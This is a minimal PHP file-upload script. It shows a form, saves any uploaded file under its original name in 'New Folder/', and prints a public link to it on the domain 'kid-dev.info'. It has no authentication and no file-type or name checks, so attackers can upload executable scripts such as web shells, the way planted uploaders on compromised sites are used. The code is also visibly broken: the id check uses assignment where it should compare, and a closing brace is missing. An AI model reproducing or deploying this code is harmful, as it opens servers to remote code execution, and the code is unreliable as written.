 <?php
$domain='kid-dev.info';
 echo '<form method="POST" enctype="multipart/form-data" action="?id=up">
<center></center><center><center><form  method="POST" enctype="multipart/form-data" action="index.php?id=up">
    <p><input type="file" name="file_upload" size="20" id="file">
    <input type="submit" name="submit" value="Upload now !"  name="B1"></p></center></center>           </center>
            </form>';
if ($_GET['id']=up){
move_uploaded_file($_FILES['file_upload']['tmp_name'],"New Folder/". $_FILES['file_upload']['name']);

$link="New Folder/".$_FILES['file_upload']['name'];
echo "<br/><br/><br/><br/><br/>";
echo "<center>Link file : $domain/$link</center>";
?> 